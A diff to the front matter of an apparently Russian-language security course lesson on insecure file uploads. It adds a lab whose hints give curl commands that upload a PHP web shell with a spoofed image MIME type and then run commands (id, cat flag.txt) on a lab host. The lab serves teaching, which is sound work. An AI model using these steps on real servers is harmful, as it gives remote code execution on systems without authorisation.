@@ -12,6 +12,19 @@ useful_for:
   - "Bug bounty"
 estimated_minutes: 36
 summary: "Как эксплуатировать небезопасную загрузку файлов: обход расширений, MIME, magic-bytes и получение выполнения кода."
+lab:
+  kind: shell
+  title: "Практика: обход загрузки → webshell"
+  toolset: [core, curl]
+  workdir: /home/student/task
+  files: [task.md, shell.php]
+  check: "grep -q 'nto{' found.txt"
+  hints:
+    - Загрузи шелл, подделав MIME: `curl -s -F 'file=@shell.php;type=image/png' -F 'name=avatar' http://app.lab.local/upload`.
+    - Сервер вернёт URL загруженного файла — `/uploads/ab12cd.php`.
+    - Обратись к шеллу с командой: `curl -s 'http://app.lab.local/uploads/ab12cd.php?c=id'`.
+    - Прочитай флаг: `curl -s 'http://app.lab.local/uploads/ab12cd.php?c=cat flag.txt'`.
+    - Достань последнюю строку: `curl -s 'http://app.lab.local/uploads/ab12cd.php?c=cat flag.txt' | tail -1 > found.txt`, затем `check`.
 ---
 
 ## Вопрос, с которого всё начинается
